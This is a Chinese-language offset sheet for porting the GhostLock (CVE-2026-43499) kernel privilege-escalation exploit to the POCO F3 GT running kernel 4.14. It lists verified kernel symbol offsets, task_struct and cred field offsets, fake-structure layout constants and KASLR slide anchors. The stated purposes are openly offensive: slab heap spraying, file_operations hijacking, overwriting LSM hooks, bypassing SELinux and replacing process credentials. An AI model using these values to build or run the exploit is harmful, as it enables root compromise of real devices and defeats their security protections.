# GhostLock (CVE-2026-43499) — POCO F3 GT (aresin) 偏移表

> **设备**: POCO F3 GT / Redmi K40 Gaming Edition (codename: aresin)
> **芯片**: MediaTek Dimensity 1200 (MT6893)
> **内核**: 4.14.186-g0dc1d312efb3
> **系统**: Android 13 / MIUI V14.0.4.0.TKJCNXM
> **日期**: 2026-07-27

---

## 内存布局

| 项目 | 值 |
|------|-----|
| `KIMAGE_TEXT_BASE` | `0xffffff939bc80000` |
| `P0_PAGE_OFFSET` | `0xffffff8000000000` |
| `P0_PHYS_OFFSET` | `0x40000000` |
| `P0_KERNEL_PHYS_LOAD` | `0x40000000` |
| `CONFIG_ARM64_VA_BITS` | 39 |

---

## 关键内核符号偏移

### 已导出符号（/proc/kallsyms 可读）

| 符号 | 偏移 (from KIMAGE_TEXT_BASE) | 来源 |
|------|----------------------------|------|
| `_stext` | `0x0` | /proc/kallsyms |
| `kmem_cache_alloc` | `0x01d66b0` | /proc/kallsyms |
| `noop_llseek` | `0x01eed5c` | /proc/kallsyms |
| `generic_pipe_buf_confirm` | `0x01fc150` | /proc/kallsyms |
| `generic_pipe_buf_release` | `0x01fc158` | /proc/kallsyms |
| `generic_pipe_buf_steal` | `0x01fc058` | /proc/kallsyms |
| `generic_pipe_buf_get` | `0x01fc0c0` | /proc/kallsyms |
| `security_file_open` | `0x03c34b4` | /proc/kallsyms |
| `security_task_alloc` | `0x03c3558` | /proc/kallsyms |
| `ashmem_mmap` | `0x0cf939c` | /proc/kallsyms |
| `ashmem_ioctl` | `0x0cf8a74` | /proc/kallsyms |
| `ashmem_open` | `0x0cf9504` | /proc/kallsyms |
| `ashmem_release` | `0x0cf9584` | /proc/kallsyms |

### 未导出符号（vmlinux ADRP 分析提取）

| 符号 | 偏移 (from KIMAGE_TEXT_BASE) | 提取方法 | 用途 |
|------|----------------------------|----------|------|
| `KMALLOC_CACHES` | `0x1783828` | ADRP 分析 `__kmalloc` | slab 堆喷控制 |
| `ASHMEM_MISC_FOPS` | `0x1da5d98` | ADRP 分析 `ashmem_mmap` | fops 劫持 |
| `SECURITY_HOOK_HEADS` | `0x15f5f70` | ADRP 分析 `security_inode_create` | LSM hook 覆盖 |
| `SELINUX_BLOB_SIZES` | `0x2080308` | ADRP 分析 `selinux_cred_prepare` | SELinux 绕过 |

### 间接引用符号（设备 kallsyms 计算）

| 符号 | 偏移 (from KIMAGE_TEXT_BASE) | 计算方法 | 用途 |
|------|----------------------------|----------|------|
| `ANON_PIPE_BUF_OPS` | `0x1fc150` | `generic_pipe_buf_confirm` 地址 | pipe buffer 识别 |
| `NOOP_LLSEEK` | `0x1eed5c` | /proc/kallsyms 直接读取 | fops 表填充 |

---

## task_struct 偏移

| 字段 | 偏移 | 来源 |
|------|------|------|
| `prio` | `0x84` | `task_blocks_on_rt_mutex` 反汇编 |
| `normal_prio` | `0x88` | prio + 4 |
| `real_cred` | `0x788` | `commit_creds` 反汇编 |
| `cred` | `0x790` | `commit_creds` 反汇编 |
| `pid` | `0x618` | 结构体分析 |
| `tgid` | `0x61c` | 结构体分析 |
| `real_parent` | `0x628` | 结构体分析 |
| `comm` | `0x830` | 结构体分析 |
| `tasks` | `0x550` | 结构体分析 |
| `pi_lock` | `0x85c` | `task_blocks_on_rt_mutex` 反汇编 |
| `pi_waiters` | `0x868` | `rt_mutex_adjust_prio_chain` 反汇编 |
| `pi_top_task` | `0x870` | `rt_mutex_adjust_prio_chain` 反汇编 |
| `pi_blocked_on` | `0x880` | `rt_mutex_adjust_prio_chain` 反汇编 |
| `seccomp` | `0x8e8` | 结构体分析 |

---

## rt_mutex_waiter 偏移

| 字段 | 偏移 | 说明 |
|------|------|------|
| `tree_entry` | `0x00` | rb_node (24 bytes) |
| `pi_tree_entry` | `0x18` | rb_node (24 bytes) |
| `task` | `0x30` | 指向 task_struct |
| `lock` | `0x38` | 指向 rt_mutex |
| `prio` | `0x40` | 优先级 |
| `deadline` | `0x48` | 截止时间 |

---

## cred 偏移

| 字段 | 偏移 |
|------|------|
| `uid` | `0x04` |
| `securebits` | `0x24` |
| `caps` | `0x30` |
| `security` | `0x80` |

---

## SELinux cred 偏移

| 字段 | 偏移 |
|------|------|
| `blob` | `0x00` |
| `osid` | `0x00` |
| `sid` | `0x04` |

---

## exploit 布局偏移

| 定义 | 值 | 说明 |
|------|-----|------|
| `LOCK_OFF` | `0x1350` | 伪造锁偏移 |
| `W0_OFF` | `0x2220` | W0 waiter 偏移 |
| `FOPS_OFF` | `0x1000` | fops 表偏移 |
| `SCRATCH_OFF` | `0x3000` | 临时缓冲区偏移 |
| `RIGHT_OFF` | `0x4440` | 右子节点偏移 |
| `LEFT_OFF` | `0x5550` | 左子节点偏移 |
| `FAKE_TASK_OFF` | `0x3200` | 伪造 task_struct 偏移 |

---

## KASLR slide 锚点

| 锚点 | 偏移 | 说明 |
|------|------|------|
| `SLIDE_NFULNL_LOGGER` | `0x01c5c658` | swapper/0 字符串 |
| `SLIDE_INIT_TASK` | `0x01c5c058` | init_task 地址 |
| `SLIDE_ROOT_TASK_GROUP` | `0x01c6e1f0` | root_task_group 地址 |

---

## 4.14 内核特殊偏移

| 定义 | 值 | 说明 |
|------|-----|------|
| `PSELECT_WAITER_WORD_SHIFT` | `2` | fd_set 字布局 |
| `CONFIG_ARM64_VA_BITS` | `39` | 虚拟地址位数 |
| `PIPE_BUFFER_SIZE` | `0x28` | pipe_buffer 结构大小 |
| `PIPE_BUFFER_SLOTS` | `32` | pipe 缓冲区槽数 |
| `STRUCT_PAGE_SIZE` | `0x40` | struct page 大小 |

---

## 与上游 CyberMeowfia (Pixel 9) 偏移对比

| 字段 | aresin (4.14.186) | tokay (6.12) | 差异原因 |
|------|-------------------|--------------|----------|
| `WAITER_PRIO_OFF` | `0x40` | `0x44` | 4.14 无 wake_state 字段 |
| `TASK_REAL_CRED_OFF` | `0x788` | `0x830` | task_struct 布局不同 |
| `TASK_CRED_OFF` | `0x790` | `0x838` | task_struct 布局不同 |
| `TASK_PI_LOCK_OFF` | `0x85c` | `0x924` | task_struct 布局不同 |
| `TASK_PI_BLOCKED_ON_OFF` | `0x880` | `0x950` | task_struct 布局不同 |
| `FOPS_IOCTL_OFF` | `0x48` | `0x50` | file_operations 布局不同 |
| `FOPS_MMAP_OFF` | `0x58` | `0x60` | file_operations 布局不同 |

---

## 偏移提取方法

| 方法 | 工具 | 适用范围 |
|------|------|----------|
| `/proc/kallsyms` | adb shell | 已导出符号 |
| vmlinux ADRP 分析 | Python + capstone | 未导出符号（需 vmlinux） |
| Ghidra headless | analyzeHeadless.bat | 完整二进制分析 |
| 设备运行时泄漏 | 自定义 C 程序 | 部分符号 |

---

## 验证状态

| 偏移 | 验证方式 | 状态 |
|------|----------|------|
| `KMALLOC_CACHES` | ADRP+ADD 模式匹配 | ✅ 已验证 |
| `ASHMEM_MISC_FOPS` | ADRP+ADD 模式匹配 (5次引用) | ✅ 已验证 |
| `SECURITY_HOOK_HEADS` | ADRP+ADD 模式匹配 | ✅ 已验证 |
| `SELINUX_BLOB_SIZES` | ADRP+ADD 模式匹配 | ✅ 已验证 |
| `ANON_PIPE_BUF_OPS` | 多 boot 偏移一致性验证 | ✅ 已验证 |
| `NOOP_LLSEEK` | /proc/kallsyms 直接读取 | ✅ 已验证 |
| task_struct 偏移 | 反汇编验证 | ✅ 已验证 |
| rt_mutex_waiter 偏移 | 反汇编验证 | ✅ 已验证 |
